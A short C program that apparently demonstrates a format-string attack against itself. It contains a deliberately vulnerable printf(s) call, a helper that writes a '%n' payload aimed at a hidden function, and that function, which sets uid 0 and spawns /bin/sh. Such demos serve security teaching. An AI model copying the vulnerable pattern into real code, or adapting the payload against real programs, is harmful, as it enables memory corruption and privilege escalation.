#include <unistd.h>
#include <stdlib.h>
#include <stdio.h>
#include <string.h>

void shell(){ //never called
    printf("\n==Attack==\nOpening a malicious shell\n");
    setuid(0);
    system("/bin/sh");
}

void vuln(char * s, int offset){
    int * ptr;
    int k,j;
    char msg[] = "Hello World!\n";
    ptr = (int *) msg;
    printf("Parsing starts at address %p\n", ptr);
    
    for (k=0; k<offset; k++) { //simple ascii to hex
        printf("%x ",*ptr);
        ptr++;
    }
    printf("%d words processed\nParsing ends at address %p\n", k, ptr);
    printf(s); //vulnerable
}

void exploit(int magic, char * msg){
    FILE * f;
    char fstr[64];
    int redirect = (int) shell; //set shell() as a redirection target
    
    if (magic == 7)
        sprintf(fstr, "%%%dx%%n", redirect); 
    else
        sprintf(fstr, "Echo: %s\n", msg);
    
    f = fopen("format.txt", "w");
    fwrite(fstr, strlen(fstr), 1, f);
    fclose(f);
}

int main(int argc, char **argv){
    FILE * f;
    int count;
    char * msg;
    char fstr[64];
    
    if (argc < 2) {
        printf("Missing first argument (integer).\nUsing number 7 as the first argument seems interesting.\nExiting...\n");
        return 0;
    }
    
    if (argc < 3) {
        printf("Missing second argument (string) to echo.\nExiting...\n");
        return 0;
    }
    
    count = (char) atoi(argv[1]) % 16;
    msg = argv[2];
    
    if (!(count > 0)) {
        printf("Incorrect first argument (%d). Exiting...\n", count);
        return 0;    
    }
   
    exploit(count, msg); //helper function to prepare a malicious input file

    printf("Reading string from file\n");
  
    f = fopen("format.txt", "r");
    if (f != NULL) {
        fread(fstr, sizeof(char), 64, f);
        fclose(f);
        vuln(fstr, count);
    }
    else {
        printf("Input file does not exist. Exiting...\n");
        return 0;
    }
  
  printf("Control has returned to main()\nNormal operation.\n");
  return 1;
}
